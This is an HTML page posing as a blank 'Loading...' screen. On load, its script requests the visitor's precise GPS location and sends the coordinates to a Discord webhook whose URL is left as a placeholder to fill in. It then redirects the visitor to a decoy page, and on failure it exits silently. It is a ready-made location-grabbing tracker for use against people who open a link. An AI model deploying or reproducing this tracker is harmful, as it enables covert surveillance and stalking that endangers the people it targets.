<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background-color: #000;
    }
  </style>
</head>
<body>
  <script>
    const webhookUrl = "YOUR_DISCORD_WEBHOOK_HERE"; // 🔁 Replace this
    const redirectUrl = "https://example.com"; // 🔁 Replace with your real final page

    function sendGPS(lat, lon, acc) {
      console.log("Latitude:", lat);
      console.log("Longitude:", lon);
      console.log("Accuracy:", acc + "m");

      fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `📍 **GPS Location Captured**\n**Lat:** ${lat}\n**Lon:** ${lon}\n**Accuracy:** ${acc}m\n🕒 ${new Date().toLocaleString()}`
        })
      });

      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 1200);
    }

    function onError(err) {
      console.warn("Location error:", err);
      window.location.href = "about:blank"; // Exit silently
    }

    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const { latitude, longitude, accuracy } = pos.coords;
            sendGPS(latitude, longitude, accuracy);
          },
          onError,
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      } else {
        onError("GPS not supported");
      }
    }

    window.addEventListener("load", () => {
      requestLocation();
      // Optional: ask for notification permission
      if ("Notification" in window) {
        Notification.requestPermission();
      }
    });
  </script>
</body>
</html>
